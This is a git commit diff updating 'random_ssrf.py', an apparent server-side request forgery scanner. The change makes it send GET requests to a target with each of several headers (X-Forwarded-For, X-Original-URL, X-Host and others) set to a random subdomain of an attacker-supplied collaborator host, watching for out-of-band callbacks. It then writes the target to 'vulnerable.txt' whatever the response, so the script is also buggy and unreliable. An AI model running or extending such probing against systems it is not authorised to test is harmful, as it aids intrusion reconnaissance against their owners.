64c06dd2ceed4b9478465fc926582e61dc132231
Ashish Kunwar <dorkerdevil280@gmail.com>
2021-09-18 20:04:45 +0530

    Update random_ssrf.py

--- random_ssrf.py
+++ random_ssrf.py
@@ -8,6 +8,7 @@ from requests.packages import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 S = 10
+list = ["X-Custom-IP-Authorization", "X-Custom-IP-Authorization", "X-Original-URL", "X-Rewrite-URL", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host", "Referrer"]
 def main():
     target = sys.argv[1]
     ssrf_baby = sys.argv[2]
@@ -18,10 +19,12 @@ def main():
             collaborator = ssrf_baby
             ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))
             collab = str(ran)+'.'+collaborator
-            target_headers = {"X-Forwarded-For": collab}
-            r = requests.get(makeup, headers=target_headers)
-            print(r.status_code)
-            print (r.headers)
+            for headerz in list:
+                target_headers = {headerz: collab}
+                r = requests.get(makeup, headers=target_headers)
+                with open("vulnerable.txt", "w") as f:
+                    f.write(target)
+                    f.close
         except Exception as error:
             print ("something went wrong")
 if __name__ == '__main__':
